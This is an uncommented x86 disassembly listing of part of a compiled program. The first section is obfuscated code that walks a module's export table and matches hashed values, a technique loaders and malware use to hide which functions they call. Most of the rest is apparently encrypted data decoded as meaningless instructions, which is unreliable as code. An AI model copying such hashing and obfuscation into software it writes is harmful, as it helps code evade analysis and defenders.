  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x423982
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	add    esi,DWORD PTR [ebp+0x3b382501]
  406360:	bound  esp,QWORD PTR [edx+0x10]
  406363:	pop    edi
  406364:	bound  esp,QWORD PTR [edx+0xb]
  406367:	(bad)  
  406368:	or     BYTE PTR [eax-0x5e8b9a33],bl
  40636e:	xchg   ecx,eax
  40636f:	lahf   
  406370:	adc    BYTE PTR [edx],0xc7
  406373:	int3   
  406374:	in     eax,0x4e
  406376:	xchg   BYTE PTR ds:[edx-0x38609e8f],ah
  40637d:	je     0x4063aa
  40637f:	cmp    al,0xb3
  406381:	icebp  
  406382:	adc    cl,BYTE PTR [ecx+0x7786aec5]
  406388:	(bad)  
  406389:	loope  0x4063f1
  40638b:	dec    eax
  40638c:	test   eax,0xaf6e90cf
  406391:	fnstenv [edi+0x7d9c4513]
  406397:	sub    eax,0x65417c56
  40639c:	ret    0x906a
  40639f:	mov    BYTE PTR [edi+0x5768cab8],al
  4063a5:	das    
  4063a6:	int3   
  4063a7:	pop    esi
  4063a8:	xchg   DWORD PTR [eax],edi
  4063aa:	or     ecx,0xd4b08fab
  4063b0:	mov    cl,0x9e
  4063b2:	cmc    
  4063b3:	into   
  4063b4:	and    al,0xa2
  4063b6:	aaa    
  4063b7:	out    dx,al
  4063b8:	push   edi
  4063b9:	scas   al,BYTE PTR es:[edi]
  4063ba:	pop    ebx
  4063bb:	mov    ebp,0xbea133d6
  4063c0:	jns    0x406415
  4063c2:	pusha  
  4063c3:	sub    esi,DWORD PTR [edi+0x2c4acdfe]
  4063c9:	int    0xce
  4063cb:	mov    ecx,0xb591682c
  4063d0:	mov    ds,eax
  4063d2:	dec    ebp
  4063d3:	lods   eax,DWORD PTR ds:[esi]
  4063d4:	(bad)  
  4063d5:	pusha  
  4063d6:	xchg   ecx,eax
  4063d7:	sub    al,0xa1
  4063d9:	call   0xc5e94fcd
  4063de:	mov    edx,DWORD PTR [ecx+esi*2]
  4063e1:	and    al,0x58
  4063e3:	clc    
  4063e4:	pop    es
  4063e5:	mov    cl,0xe
  4063e7:	adc    BYTE PTR [ebp+0x293a7aec],al
  4063ed:	rol    BYTE PTR [eax-0x23bdf531],cl
  4063f3:	imul   esi,DWORD PTR [ebp+0x38],0x2e46e2b2
  4063fa:	push   ds
  4063fb:	mov    bh,0x6c
  4063fd:	aaa    
  4063fe:	fldcw  WORD PTR [eax+0x64e100e8]
  406404:	stos   DWORD PTR es:[edi],eax
  406405:	mov    al,0xa
  406407:	add    DWORD PTR ds:0x323e09e4,ebx
  40640d:	hlt    
  40640e:	push   es
  40640f:	in     al,0x50
  406411:	repz push ds
  406413:	enter  0x982c,0x1
  406417:	nop
  406418:	fld    TBYTE PTR [ebp-0x70]
  40641b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40641c:	mov    ebx,0x6d7914f8
  406421:	cwde   
  406422:	popf   
  406423:	push   ss
  406424:	pop    esi
  406425:	inc    edx
  406426:	fcomp  DWORD PTR [esi+0x47]
  406429:	mov    BYTE PTR [ecx],cl
  40642b:	adc    DWORD PTR [edi+0x8],ebx
  40642e:	mov    ecx,0xc071e586
  406433:	add    edx,ecx
  406435:	jmp    0x4063f0
  406437:	leave  
  406438:	add    ebp,DWORD PTR [eax-0xa]
  40643b:	jle    0x406400
  40643d:	sbb    al,BYTE PTR [ebx-0x6c97518b]
  406443:	and    DWORD PTR [ecx-0x5c90159],ecx
  406449:	sub    BYTE PTR [eax+0x1e],cl
  40644c:	adc    ch,ch
  40644e:	add    ebp,DWORD PTR [ebx+0x7e]
  406451:	or     DWORD PTR [ebx],esp
  406453:	jl     0x4064a3
  406455:	cmp    ch,cl
  406457:	fld    TBYTE PTR [ebp-0x19]
  40645a:	add    bl,BYTE PTR [esi+0x105c8fed]
  406460:	mov    DWORD PTR ds:0xe096197d,esi
  406466:	outs   dx,DWORD PTR ds:[esi]
  406467:	gs iret 
  406469:	add    ch,ch
  40646b:	into   
  40646c:	aas    
  40646d:	jo     0x40649e
  40646f:	mov    ds:0x2492f116,eax
  406474:	pop    es
  406475:	xchg   esp,eax
  406476:	sbb    ah,BYTE PTR [ebx+edx*8-0x64]
  40647a:	fcmovbe st,st(2)
  40647c:	std    
  40647d:	in     al,0xd3
  40647f:	stc    
  406480:	addr16 inc esp
  406482:	pop    eax
  406483:	jmp    0x3f986a69
  406488:	cld    
  406489:	in     eax,0x78
  40648b:	cmp    DWORD PTR [edi-0x4de535f4],ecx
  406491:	push   edi
  406492:	rcr    DWORD PTR [esi+eax*2],1
  406495:	pop    edi
  406496:	rol    DWORD PTR [ebp+0x2cefa30b],1
  40649c:	bound  edi,QWORD PTR [edi+0x4b349f0d]
  4064a2:	mov    eax,0x6e49ada0
  4064a7:	ins    BYTE PTR es:[edi],dx
  4064a8:	xor    BYTE PTR [ebp-0x18],bl
  4064ab:	call   0x9674:0x36a7c5d3
  4064b2:	fnstenv [ecx+ebp*1]
  4064b5:	call   0x15c18f8b
  4064ba:	imul   esp,ebx,0xffffff90
  4064bd:	pop    ecx
  4064be:	aas    
  4064bf:	adc    al,0x5
  4064c1:	xchg   ecx,eax
  4064c2:	and    DWORD PTR [eax-0x71510217],esp
  4064c8:	sahf   
  4064c9:	pop    ecx
  4064ca:	sbb    ecx,edx
  4064cc:	std    
  4064cd:	mov    al,ds:0x4c3c28e1
  4064d2:	or     ebp,DWORD PTR [esi]
  4064d4:	icebp  
  4064d5:	push   0xe27cf4b1
  4064da:	mov    cl,0x81
  4064dc:	jo     0x4064ab
  4064de:	mov    al,0x6d
  4064e0:	inc    ebx
  4064e1:	cli    
  4064e2:	(bad)  
  4064e3:	adc    DWORD PTR [esi-0x76],ecx
  4064e6:	or     eax,0xc460388d
  4064eb:	iret   
  4064ec:	xchg   edi,eax
  4064ed:	inc    esi
  4064ee:	push   ebx
  4064ef:	add    esp,ebx
  4064f1:	add    DWORD PTR [eax-0x76912d92],0x4306cd51
  4064fb:	xor    dh,bh
  4064fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064fe:	sub    BYTE PTR [ebp-0x49],bl
  406501:	pop    eax
  406502:	cs push edi
  406504:	hlt    
  406505:	push   ds
  406506:	scas   al,BYTE PTR es:[edi]
  406507:	call   DWORD PTR [edx]
  406509:	hlt    
  40650a:	inc    esp
  40650b:	mov    eax,0x6a0d4c3a
  406510:	sbb    BYTE PTR [ebp+eiz*8-0xa],ah
  406514:	hlt    
  406515:	and    BYTE PTR ds:0x7aee8140,bh
  40651b:	adc    ebp,eax
  40651d:	outs   dx,DWORD PTR ds:[esi]
  40651e:	dec    eax
  40651f:	inc    esi
  406520:	lea    edx,[ebx+0x6d0ddd8e]
  406526:	in     eax,dx
  406527:	adc    DWORD PTR [ecx+0x6dadbcac],eax
  40652d:	inc    BYTE PTR [edi]
  40652f:	mov    bl,0xb0
  406531:	sti    
  406532:	sub    ebp,ebp
  406534:	js     0x4065a1
  406536:	(bad)  
  406537:	add    al,0x2a
  406539:	scas   al,BYTE PTR es:[edi]
  40653a:	xchg   edi,eax
  40653b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40653c:	xchg   BYTE PTR [eax],dl
  40653e:	mov    esp,0x10cf1133
  406543:	xchg   edi,eax
  406545:	and    eax,0x9461e211
  40654a:	cmp    edx,DWORD PTR ds:0x7cf6a886
  406550:	adc    eax,DWORD PTR [edi]
  406552:	js     0x4064f6
  406554:	pop    ecx
  406555:	jno    0x406559
  406557:	(bad)  
  406558:	cmp    eax,0x67412544
  40655d:	adc    eax,0xc20f784d
  406562:	sbb    edx,DWORD PTR [ebx]
  406564:	fsubp  st(2),st
  406566:	sti    
  406567:	sbb    al,0x88
  406569:	xchg   esp,eax
  40656a:	sub    al,0xb2
  40656c:	cmp    bh,BYTE PTR [ebp+0x6c]
  40656f:	push   ebx
  406570:	cwde   
  406571:	and    BYTE PTR [edi+0x3f],ah
  406574:	sub    al,0x68
  406576:	dec    ebx
  406577:	mov    eax,0xa73ed6a1
  40657c:	cld    
  40657d:	call   DWORD PTR [edx-0x51]
  406580:	push   ecx
  406581:	cwde   
  406582:	scas   eax,DWORD PTR es:[edi]
  406583:	and    bl,BYTE PTR [eax+0x6a2e69ec]
  406589:	push   es
  40658a:	clc    
  40658b:	shr    DWORD PTR [esi-0x6839aa22],0x90
  406592:	push   ebx
  406593:	xchg   ebx,eax
  406594:	mov    bl,0x8a
  406596:	mov    bh,0xed
  406598:	jne    0x4065b1
  40659a:	jbe    0x40652f
  40659c:	call   0x5fc2:0xb797fc0f
  4065a3:	sbb    BYTE PTR [esi],bl
  4065a5:	into   
  4065a6:	retf   
  4065a7:	dec    ebx
  4065a8:	int3   
  4065a9:	pop    esi
  4065aa:	jae    0x406566
  4065ac:	mov    dl,0xa7
  4065ae:	cmp    al,0xb
  4065b0:	stos   BYTE PTR es:[edi],al
  4065b1:	sahf   
  4065b2:	(bad)  
  4065b3:	shl    BYTE PTR [edi+0x2a],cl
  4065b6:	mov    ?,WORD PTR [eax+0x62]
  4065b9:	inc    eax
  4065ba:	out    0xb7,al
  4065bc:	ret    
  4065bd:	shr    edx,cl
  4065bf:	xchg   ebp,eax
  4065c0:	bound  esp,QWORD PTR [edx+0x30]
  4065c3:	xlat   BYTE PTR ds:[ebx]
  4065c4:	xor    esp,DWORD PTR [esi-0x2c0b1e11]
  4065ca:	or     DWORD PTR [ecx+0x52b3af09],ebx
  4065d0:	sub    DWORD PTR [ecx-0x55],esp
  4065d3:	add    al,0x4e
  4065d5:	and    al,0x48
  4065d7:	push   esi
  4065d8:	int3   
  4065d9:	push   bx
  4065db:	call   0x823ad9e0
  4065e0:	mov    eax,ds:0xe6e41087
  4065e5:	xchg   edi,eax
  4065e6:	cwde   
  4065e7:	mov    al,ds:0x809bd640
  4065ec:	jecxz  0x4065e7
  4065ee:	inc    ecx
  4065ef:	jl     0x406638
  4065f1:	xchg   dh,dl
  4065f3:	popa   
  4065f4:	xchg   edi,eax
  4065f5:	retf   
  4065f6:	pop    ecx
  4065f7:	stos   DWORD PTR es:[edi],eax
  4065f8:	cmp    dh,BYTE PTR [edi+0x71]
  4065fb:	inc    ecx
  4065fc:	mov    ecx,0x55331a88
  406601:	xor    ah,BYTE PTR [edx]
  406603:	clc    
  406604:	adc    DWORD PTR [ebx-0x3e],esp
  406607:	push   eax
  406608:	cmp    al,BYTE PTR [edx+0x15]
  40660b:	sbb    DWORD PTR [edi],ebp
  40660d:	lods   eax,DWORD PTR ds:[esi]
  40660e:	xor    al,0x6e
  406610:	push   ebp
  406611:	sub    ah,0xa5
  406614:	dec    eax
  406615:	(bad)  
  406617:	jne    0x40661e
  406619:	fmul   QWORD PTR [edi]
  40661b:	cs or  esi,eax
  40661e:	jbe    0x4065c5
  406620:	xor    eax,0xd79f4c22
  406625:	xor    eax,DWORD PTR [ebp+0x61922c11]
  40662b:	popf   
  40662c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40662d:	push   0xf
  40662f:	mov    cs,WORD PTR [eax+edi*2-0x23cc592f]
  406636:	mov    edi,0xc4a9a279
  40663b:	popa   
  40663c:	test   al,0xc2
  40663e:	test   bl,dh
  406640:	pop    ebx
  406641:	cld    
  406642:	push   esp
  406643:	scas   al,BYTE PTR es:[edi]
  406644:	stos   DWORD PTR es:[edi],eax
  406645:	mov    ah,0x6
  406647:	xor    dh,bl
  406649:	pusha  
  40664a:	jb     0x4065cd
  40664c:	xchg   ecx,eax
  40664d:	out    dx,eax
  40664e:	rcl    DWORD PTR [edi],0x29
  406651:	jp     0x406605
  406653:	jae    0x40660e
  406655:	mov    eax,ds:0x188a38e
  40665a:	sbb    ebx,ebx
  40665c:	and    esi,DWORD PTR [edx+esi*4-0x36]
  406660:	fwait
  406661:	shl    BYTE PTR [eax+0xf],0xfd
  406665:	ds fst st(7)
  406668:	mov    al,ds:0x6e0b8c76
  40666d:	push   ss
  40666e:	jnp    0x406641
  406670:	inc    ebp
  406671:	and    eax,0x10582f07
  406676:	std    
  406677:	out    dx,eax
  406678:	push   edi
  406679:	(bad)  
  40667a:	(bad)  
  40667b:	push   0xffffffbc
  40667d:	lock fsub st(7),st
  406680:	cmp    eax,0xe8d7bf85
  406685:	lods   al,BYTE PTR ds:[esi]
  406686:	sbb    ebp,DWORD PTR [edx+0x670c6bd6]
  40668c:	dec    edi
  40668d:	dec    esp
  40668e:	and    al,0xc8
  406690:	mov    cl,BYTE PTR [edx]
  406692:	imul   ecx,ebp,0x11
  406695:	sahf   
  406696:	push   ecx
  406697:	popf   
  406698:	push   ebp
  406699:	cdq    
  40669a:	ret    
  40669b:	fdiv   st(2),st
  40669d:	mov    bh,0x38
  40669f:	rol    BYTE PTR ds:0xbf61f601,1
  4066a5:	xchg   ecx,eax
  4066a6:	ins    DWORD PTR es:[edi],dx
  4066a7:	sub    edx,ebx
  4066a9:	setl   al
  4066ac:	add    DWORD PTR [edi],0xffffff99
  4066af:	push   esp
  4066b0:	into   
  4066b1:	pusha  
  4066b2:	and    DWORD PTR [esi+0x77],edi
  4066b5:	xor    eax,0x689323ea
  4066ba:	lods   al,BYTE PTR ds:[esi]
  4066bb:	mov    esi,0x5de0f85e
  4066c0:	pop    esi
  4066c1:	lock into 
  4066c3:	fs or  eax,0x585069a
  4066c9:	aad    0x1c
  4066cb:	push   esi
  4066cc:	sub    ebp,ebx
  4066ce:	ret    0x8825
  4066d1:	push   edx
  4066d2:	and    al,0x49
  4066d4:	xor    al,0x20
  4066d6:	jae    0x40672c
  4066d8:	sbb    BYTE PTR [ebx-0x20ac4dbf],ch
  4066de:	xchg   DWORD PTR [eax+0x2eda34a6],ebp
  4066e4:	and    ah,0xa
  4066e7:	stos   DWORD PTR es:[edi],eax
  4066e8:	(bad)  
  4066e9:	retf   
  4066ea:	mov    dl,0xb6
  4066ec:	jae    0x40675d
  4066ee:	inc    ecx
  4066ef:	rol    BYTE PTR [eax+0x4bb73c08],0x27
  4066f6:	in     eax,dx
  4066f7:	loopne 0x406747
  4066f9:	sbb    BYTE PTR [ebp+0x43],ah
  4066fc:	jge    0x4066c7
  4066fe:	icebp  
  4066ff:	or     ebp,DWORD PTR ds:0xbb526ce6
  406705:	lds    eax,FWORD PTR [ebp+0x6]
  406708:	cwde   
  406709:	bound  edx,QWORD PTR [edi]
  40670b:	mov    eax,ds:0xaa75a803
  406710:	pop    esi
  406711:	add    DWORD PTR [esp+edx*8],0xffffffbd
  406715:	or     DWORD PTR [ebp+0x20f65cd8],0x67
  40671c:	mov    ebp,0xe75b6d23
  406721:	aas    
  406722:	imul   edi,ebx,0x12
  406725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406726:	in     al,dx
  406727:	add    esp,DWORD PTR [eax]
  406729:	call   0x7e81:0xd31066ea
  406730:	adc    DWORD PTR [ebx],ebp
  406732:	cdq    
  406733:	(bad)  
  406734:	iret   
  406735:	ret    
  406736:	lock push ebp
  406738:	add    al,ch
  40673a:	lods   al,BYTE PTR ds:[esi]
  40673b:	popf   
  40673c:	mov    al,ds:0x31b8700e
  406741:	xchg   edi,eax
  406742:	jbe    0x4067ad
  406744:	adc    al,0x57
  406746:	or     eax,0x9986b76
  40674b:	out    0xf2,al
  40674d:	dec    edi
  40674e:	cld    
  40674f:	shl    ecx,0x95
  406752:	push   DWORD PTR [edi+0x53510f71]
  406758:	ror    BYTE PTR [edi-0x34],cl
  40675b:	or     DWORD PTR [ebp+0x4f],esi
  40675e:	cmp    ecx,DWORD PTR [ebx+edi*4-0x2adb1898]
  406765:	call   0x59d54667
  40676a:	ds ja  0x4067ad
  40676d:	push   edi
  40676e:	stc    
  40676f:	fimul  DWORD PTR [esi+0x72]
  406773:	and    al,0x74
  406775:	sub    edx,DWORD PTR [eax-0x7e5ab1a0]
  40677b:	mov    dh,0xd
  40677d:	mov    es,WORD PTR [eax+0x6b]
  406780:	out    0x90,al
  406782:	ficomp WORD PTR [ebp+0xf]
  406785:	(bad)  
  406786:	loopne 0x406762
  406788:	les    edx,FWORD PTR [edx]
  40678a:	xlat   BYTE PTR ds:[ebx]
  40678b:	shl    DWORD PTR [ebx-0x72e099d4],1
  406791:	outs   dx,DWORD PTR ds:[esi]
  406792:	ins    BYTE PTR es:[edi],dx
  406793:	cld    
  406794:	jno    0x4067f9
  406796:	xor    dh,BYTE PTR [ebx]
  406798:	sub    eax,DWORD PTR [eax-0x18]
  40679b:	scas   al,BYTE PTR es:[edi]
  40679c:	mov    esi,0x9c87710c
  4067a1:	mov    esp,0x466c21c6
  4067a6:	jno    0x406757
  4067a8:	aas    
  4067a9:	ror    DWORD PTR [ebp+eax*8+0x58],0xe4
  4067ae:	mov    eax,ds:0x2008f60
  4067b3:	cmc    
  4067b4:	jmp    0x406749
  4067b6:	mov    bl,0x93
  4067b8:	mov    al,ds:0xbc12a56c
  4067bd:	into   
  4067be:	rcr    DWORD PTR [ecx],0x62
  4067c1:	test   al,0x24
  4067c3:	lds    edx,FWORD PTR [ebx+0x6]
  4067c6:	jp     0x4067a4
  4067c8:	cdq    
  4067c9:	fwait
  4067ca:	jp     0x40674f
  4067cc:	sub    eax,0xa9a81f15
  4067d1:	mov    ch,0x46
  4067d3:	adc    ebp,DWORD PTR [ecx-0x1a]
  4067d6:	jns    0x40683c
  4067d8:	jmp    0xd603d206
  4067dd:	mov    ?,WORD PTR [ebp-0x27]
  4067e0:	loope  0x406851
  4067e2:	push   ebp
  4067e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067e4:	fsubrp st(6),st
  4067e6:	or     ah,dh
  4067e8:	retf   
  4067e9:	push   edx
  4067ea:	or     eax,0x642c7803
  4067ef:	jb     0x406829
  4067f1:	mov    edx,0x5b322aad
  4067f6:	aad    0xba
  4067f8:	imul   BYTE PTR [esi+0x16]
  4067fb:	inc    edi
  4067fc:	inc    esi
  4067fd:	mov    al,0x83
  4067ff:	and    al,0x6b
  406801:	cdq    
  406802:	lds    edx,FWORD PTR ds:0x2e60670e
  406808:	retf   0x2c91
  40680b:	dec    ebp
  40680c:	int    0xc5
  40680e:	add    al,0x4d
  406810:	or     esp,DWORD PTR [ebp+ecx*2-0x3c]
  406814:	shr    ecx,1
  406816:	fldcw  WORD PTR [edx-0x78]
  406819:	pop    eax
  40681a:	into   
  40681b:	and    eax,0xaa0fae71
  406820:	das    
  406821:	(bad)  
  406822:	(bad)  
  406823:	ss loope 0x406841
  406826:	jne    0x406802
  406828:	mov    ebp,0xef3c6586
  40682d:	ds cmp eax,0x583d0d95
  406833:	pusha  
  406834:	sbb    eax,DWORD PTR [ebp+0x28]
  406837:	mov    dl,0x82
  406839:	nop
  40683a:	mov    ecx,0x3535dab3
  40683f:	push   edi
  406840:	sbb    eax,esi
  406842:	fdiv   st,st(6)
  406844:	jmp    0x406848
  406846:	enter  0xe974,0x30
  40684a:	jno    0x40681c
  40684c:	dec    ebx
  40684d:	js     0x40689f
  40684f:	pop    esi
  406850:	rcl    DWORD PTR [ecx],cl
  406852:	aad    0xc2
  406854:	mov    ah,cl
  406856:	stos   BYTE PTR es:[edi],al
  406857:	mov    bh,0x97
  406859:	pop    esp
  40685a:	aas    
  40685b:	cs aam 0xca
  40685e:	jmp    0x40681d
  406860:	push   esi
  406861:	mov    BYTE PTR ds:0xc89cbdfa,dl
  406867:	fisttp QWORD PTR [edi]
  406869:	inc    ebp
  40686a:	xor    cl,BYTE PTR [edx]
  40686c:	ds add bl,bh
  40686f:	retf   0xcf8b
  406872:	test   BYTE PTR [eax],ah
  406874:	jg     0x4068ca
  406876:	pop    ds
  406877:	and    DWORD PTR [ebp-0x76cbccb4],edi
  40687d:	mov    bl,0x65
  40687f:	not    DWORD PTR [edx]
  406881:	ret    
  406882:	or     ebp,DWORD PTR [ebp-0x11500891]
  406888:	into   
  406889:	or     ebx,DWORD PTR [ecx+0x76]
  40688c:	push   edx
  40688d:	xchg   esi,eax
  40688e:	stos   DWORD PTR es:[edi],eax
  40688f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406890:	xchg   cl,cl
  406892:	cmp    bh,BYTE PTR [esi+0x2c7576d3]
  406898:	pop    edx
  406899:	pop    esi
  40689a:	xor    cl,ah
  40689c:	sbb    eax,0x135e05c9
  4068a1:	sub    al,0x96
  4068a3:	leave  
  4068a4:	sbb    esp,ebp
  4068a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068a7:	push   ebx
  4068a8:	popa   
  4068a9:	aaa    
  4068aa:	xchg   edi,eax
  4068ab:	pop    esi
  4068ac:	shl    dl,1
  4068ae:	pusha  
  4068af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068b0:	fs xchg esi,eax
  4068b3:	lock xor al,0x39
  4068b6:	aam    0x9c
  4068b8:	mov    edi,0x3d93ece6
  4068bd:	sahf   
  4068be:	jno    0x406874
  4068c0:	adc    DWORD PTR [ecx],esp
  4068c2:	dec    ecx
  4068c3:	or     DWORD PTR [edi+eax*2],esp
  4068c6:	(bad)  
  4068c7:	fild   DWORD PTR [eax-0x3f5a3c0e]
  4068cd:	mov    bl,0x12
  4068cf:	xor    eax,0xfc20b964
  4068d4:	outs   dx,BYTE PTR ds:[esi]
  4068d5:	adc    eax,0xfe823f0f
  4068da:	jns    0x40693f
  4068dc:	(bad)  
  4068dd:	stc    
  4068de:	sbb    al,0x7
  4068e0:	popf   
  4068e1:	scas   al,BYTE PTR es:[edi]
  4068e2:	jmp    FWORD PTR [eax-0x46]
  4068e5:	setae  BYTE PTR [edx+esi*8]
  4068e9:	adc    edx,DWORD PTR [esi+0x3]
  4068ec:	(bad)  
  4068ed:	xchg   esp,eax
  4068ee:	into   
  4068ef:	arpl   WORD PTR ds:0x32d60278,si
  4068f5:	jnp    0x4068a1
  4068f7:	mov    ah,0x6e
  4068f9:	sub    al,0xf1
  4068fb:	call   0xcc719187
  406900:	imul   esi,DWORD PTR [edx+0x26],0xfffffff1
  406904:	test   BYTE PTR [edx],bh
  406906:	div    DWORD PTR [ebx+0x250a09f]
  40690c:	rol    bl,0x71
  40690f:	mov    dl,0xf3
  406911:	and    al,0xd9
  406913:	das    
  406914:	push   ss
  406915:	test   DWORD PTR [ebx+0x7f],eax
  406918:	sub    DWORD PTR [ebx+edi*8],esi
  40691b:	mov    bl,0xfe
  40691d:	xchg   edx,eax
  40691e:	dec    esp
  40691f:	repz jne 0xd5e19acf
  406926:	shl    BYTE PTR [edx],1
  406928:	ss add eax,0x2cace2c4
  40692e:	xchg   edx,eax
  40692f:	fcos   
  406931:	ret    0xd8cd
  406934:	jmp    0xc6df:0x71ce1917
  40693b:	xchg   edx,eax
  40693c:	mov    al,BYTE PTR [edi]
  40693e:	out    0x55,eax
  406940:	shr    DWORD PTR [esi+edx*1],cl
  406943:	je     0x4068d2
  406945:	rcr    BYTE PTR [esi-0x31bd0897],1
  40694b:	adc    DWORD PTR [ebp+0x52],0x23
  40694f:	dec    ebp
  406950:	stos   DWORD PTR es:[edi],eax
  406951:	lods   eax,DWORD PTR ds:[esi]
  406952:	scas   eax,DWORD PTR es:[edi]
  406953:	ds cmp eax,0x387f5ff2
  406959:	inc    ebx
  40695a:	test   BYTE PTR [ebp+0x6ab43ba5],bh
  406960:	ins    BYTE PTR es:[edi],dx
  406961:	test   DWORD PTR ds:0xa34ed983,ebx
  406967:	(bad)  
  406968:	stos   DWORD PTR es:[edi],eax
  406969:	mov    ebp,0x78afbc6b
  40696e:	inc    edx
  40696f:	jae    0x4069d3
  406971:	aad    0xb9
  406973:	add    ebp,DWORD PTR [ecx-0x794a0814]
  406979:	pop    eax
